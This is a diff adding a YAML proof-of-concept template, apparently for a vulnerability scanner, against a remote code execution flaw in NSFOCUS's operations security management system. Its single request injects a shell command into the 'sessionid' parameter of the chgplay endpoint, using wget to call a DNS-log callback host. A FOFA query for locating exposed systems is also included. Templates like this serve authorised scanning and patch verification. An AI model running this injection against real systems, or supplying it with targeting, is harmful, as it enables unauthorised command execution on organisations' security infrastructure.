@@ -1,0 +1,18 @@
+id: poc-yaml-nsfocus-osms-chgplay-rce
+info:
+  name: 绿盟运维安全管理系统 chgplay 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - DNSLOG
+  finger: 绿盟运维安全管理系统
+  fofa: body="'/needUsbkey.php?username='"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=;wget%20http://{{.domain}}/11111;
+  expression: status_code == 200 && body == "" && contains(headers,"Server\x3a NSFOCUS")
+    && reverse.Verify()
+transport: http
